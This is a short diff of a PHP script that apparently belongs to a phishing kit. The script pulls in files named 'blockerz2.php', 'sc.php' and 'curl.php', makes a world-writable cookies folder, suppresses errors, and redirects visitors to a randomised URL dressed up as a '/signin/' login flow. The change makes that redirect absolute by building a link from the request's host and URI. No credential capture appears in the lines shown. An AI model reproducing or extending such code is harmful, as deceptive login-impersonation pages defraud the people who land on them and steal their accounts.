@@ -6,13 +6,14 @@ include '../blockerz2.php';
 include '../sc.php';
 include '../curl.php';
 
+$actual_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 
 if (!file_exists('cookies')) {@mkdir('cookies', 0777, true);}
 
 error_reporting(0);
 
 if (!isset($_GET['ID']) && !isset($_GET['status'])) {
-    echo "<META HTTP-EQUIV='refresh' content='0; URL=?ID=login&Key=".@md5(@microtime())."&login&path=/signin/?referrer'>";
+    echo "<META HTTP-EQUIV='refresh' content='0; URL=".$actual_link."?ID=login&Key=".@md5(@microtime())."&login&path=/signin/?referrer'>";
 exit();
 }
 
